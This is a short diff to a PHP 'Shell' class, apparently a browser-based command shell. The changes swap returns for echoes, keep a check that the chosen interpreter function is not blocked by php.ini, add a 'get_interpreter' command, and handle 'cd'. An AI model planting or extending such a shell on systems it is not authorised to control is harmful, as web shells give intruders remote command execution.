@@ -68,15 +68,17 @@ class Shell{
 				$disabled_functions = $this->disabled_functions();
 				if( function_exists($interpreter) ){
 					if( in_array($interpreter, $disabled_functions) ){
-						return "Error. Function '{$interpreter}' is blocked by php.ini";
+						echo "Error. Function '{$interpreter}' is blocked by php.ini";
 					}else{
 						$_SESSION['interpreter'] = $interpreter;
 						$this->config['interpreter'] = $interpreter;
-						return "Success. Function '{$interpreter}' was set correctly.";
+						echo "Success. Function '{$interpreter}' was set correctly.";
 					}
 				}else{
-					return "Error. Function '{$interpreter}' does not exists.";
+					echo "Error. Function '{$interpreter}' does not exists.";
 				}
+			}elseif( preg_match('/^get_interpreter$/', $command) ){
+				echo "Current interpreter set as: {$this->config['interpreter']}";
 			}elseif( preg_match('/^cd (.*)/', $command, $match) ){
 				$_SESSION['cwd'] = realpath($match[1]);
 				echo "Changed directory to: {$_SESSION['cwd']}";
